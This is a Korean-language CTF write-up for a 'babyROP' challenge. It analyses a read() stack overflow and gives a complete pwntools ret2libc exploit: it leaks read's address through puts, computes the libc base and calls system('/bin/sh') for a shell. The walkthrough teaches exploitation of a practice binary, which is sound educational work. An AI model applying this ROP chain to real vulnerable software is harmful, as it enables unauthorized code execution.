# babyROP 문제 풀이



## Proof of concopt

### checksec

![image](https://user-images.githubusercontent.com/59410565/119943484-11ef5d80-bfce-11eb-8518-d384ee74d8e9.png)

64bit 파일이고, Partial RELRO와 NX가 적용되어 있다. 따라서 ROP로 우회하여 공격할 수 있을 것 같다.

### IDA

> main() 함수

![image](https://user-images.githubusercontent.com/59410565/119944206-efaa0f80-bfce-11eb-9239-ecca41240c9c.png)

"Welcome to 64bit ROP world!\n"를 출력하고 "What is your name?\n"을 출력한다(0x12 길이 만큼). read() 함수를 통해 buf를 입력받는다. 이때 buf의 크기보다 더 많이 입력을 받을 수 있어 overflow가 발생한다. 이후 "Hello, buf의 내용!!\n"을 출력한 뒤 종료한다.



### GDB

![image](https://user-images.githubusercontent.com/59410565/119944879-c6d64a00-bfcf-11eb-9516-d5576759c437.png)

**[Break Point]**

- main+0 : main() 함수 코드 첫 부분
- main+65 : read() 함수 호출 전

![image](https://user-images.githubusercontent.com/59410565/119945457-71e70380-bfd0-11eb-8182-0d2165d96c38.png)

![image](https://user-images.githubusercontent.com/59410565/119945576-993dd080-bfd0-11eb-8c0c-09c9b9f81a1a.png)

Return address와 buf 변수의 시작 주소의 차는 72이다. 즉, 72개 이상의 문자를 입력하면 RET을 변조할 수 있다. 



## Exploit

### Exploit 순서

```
1. read.got를 puts.plt에 저장
2. "?"까지 받아온 뒤, payload 전달 >> read 주소를 알아내기 위함
3. u64(r.recvuntil("\x7f")[-6:].ljust(8, '\x00'))을 사용해 read address를 얻어와 libcbase를 구함
4. binsh와 system 전달
```



### plt, got 주소 찾기 - read, puts

> pwntools를 사용하여 주소를 출력하기

```python
from pwn import *

e = ELF("./babyROP")

read_got = e.got["read"]
read_plt = e.plt["read"]
print("read@got : " + str(hex(e.got["read"])))
print("read@plt : " + str(hex(e.plt["read"])))

puts_plt = e.plt["puts"]
print("puts@plt : " + str(hex(e.plt["puts"])))
```



### 가젯 찾기

> rp++

![image](https://user-images.githubusercontent.com/59410565/119947809-1d915300-bfd3-11eb-8b36-4a3ec2d174f4.png)

> ROPgadget

![image](https://user-images.githubusercontent.com/59410565/119948037-634e1b80-bfd3-11eb-9e92-94cf3280fe78.png)

```python
pop_rdi_ret = 0x4006c3
```



### system(), "/bin/sh" offset 찾기

```python
libcbase_system_offset = e.libc.symbols['system']
binsh_offset = 0x18ce57
```

![image](https://user-images.githubusercontent.com/59410565/119952139-a4482f00-bfd7-11eb-896d-b1ff97e6fc86.png)

![image](https://user-images.githubusercontent.com/59410565/119951974-7ebb2580-bfd7-11eb-93f5-fe3082dd14f6.png)



### Exploit code

```python
from pwn import *

#context.log_level = 'debug'

e = ELF("./babyROP")
r = process('./babyROP')

read_got = e.got["read"]
read_plt = e.plt["read"]
print("read@got : " + str(hex(e.got["read"])))
print("read@plt : " + str(hex(e.plt["read"])))

puts_plt = e.plt["puts"]
print("puts@plt : " + str(hex(e.plt["puts"])))

main_addr = e.symbols['main']

pop_rdi_ret = 0x4006c3

libcbase_system_offset = e.libc.symbols['system']
libcbase_read_offset = e.libc.symbols['read']
binsh_offset = 0x18ce57
print("system offset : " + str(hex(libcbase_system_offset)))
print("read offset : " + str(hex(libcbase_read_offset)))
print("binsh offset : " + str(hex(binsh_offset)))

payload = "A"*72
payload += p64(pop_rdi_ret)
payload += p64(read_got)
payload += p64(puts_plt)
payload += p64(main_addr)

r.recvuntil("?")
r.send(payload)

read_addr = u64(r.recvuntil("\x7f")[-6:].ljust(8, '\x00'))
print("read addr : " + str(hex(read_addr)))
libcbase = read_addr - libcbase_read_offset
print("libcbase : " + str(hex(libcbase)))

#/bin/sh
payload = "A"*72
payload += p64(pop_rdi_ret)
payload += p64(libcbase + binsh_offset)
payload += p64(libcbase + libcbase_system_offset)

r.send(payload)
r.interactive()
```



### Result

![image](https://user-images.githubusercontent.com/59410565/119957583-27b84f00-bfdd-11eb-942b-0e76dab5eb42.png)